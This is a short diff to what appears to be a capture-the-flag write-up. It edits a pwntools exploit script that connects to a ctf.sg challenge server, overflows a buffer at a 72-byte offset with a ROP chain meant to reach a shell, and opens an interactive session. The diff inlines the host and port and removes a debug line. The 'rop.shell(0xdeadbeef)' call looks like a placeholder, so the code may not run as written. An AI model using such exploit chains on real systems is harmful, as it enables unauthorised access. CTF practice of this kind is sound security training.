@@ -141,18 +141,13 @@ Here's a script for thought
 ```py
 from pwn import *
 
-HOST = '3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg'
-PORT = '30201'
-
-p = remote(HOST, PORT)
+p = remote('3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg', 30201)
 
 context.binary = elf = ELF('callmemaybe')
 
 rop = ROP(elf)
 rop.call(rop.ret)
 rop.shell(0xdeadbeef)
-
-log.info(rop.dump())
 
 p.sendlineafter("=> ", flat({ 72: rop.chain() }))
 p.interactive()
